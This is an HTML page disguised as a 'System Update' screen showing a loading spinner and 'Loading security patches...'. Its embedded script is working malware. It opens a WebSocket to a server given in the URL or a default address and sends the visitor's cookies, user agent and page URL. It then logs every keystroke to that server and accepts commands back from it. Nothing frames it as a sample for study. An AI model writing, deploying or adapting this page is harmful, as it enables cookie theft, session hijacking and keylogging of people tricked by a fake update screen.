<!DOCTYPE html>
<html>
<head>
<title>System Update</title>
<meta charset="UTF-8">
<style>
body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding:50px}
h1{font-size:2em;margin:30px 0}
.loader{border:5px solid #111;border-top:5px solid #0f0;border-radius:50%;width:50px;height:50px;margin:0 auto;animation:spin 1s linear infinite}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
</style>
</head>
<body>
<h1>ðŸ“¡ SYSTEM UPDATE</h1>
<div class="loader"></div>
<p>Loading security patches...</p>
<script>
const params = new URLSearchParams(location.search);
const server = params.get('s') || 'ws://192.168.1.5:8080';
try {
  const ws = new WebSocket(server);
  ws.onopen = () => {
    ws.send(JSON.stringify({
      type:'info',
      url:location.href,
      ua:navigator.userAgent,
      cookies:document.cookie
    }));
  };
  ws.onmessage = (e) => {
    try {
      const cmd = JSON.parse(e.data);
      if(cmd.cmd==='alert') alert(cmd.msg);
    } catch{}
  };
} catch{}
document.addEventListener('keydown',e=>{
  try{
    const ws=new WebSocket(server);
    ws.onopen=()=>ws.send(JSON.stringify({type:'key',key:e.key}));
  }catch{}
});
</script>
</body>
</html>
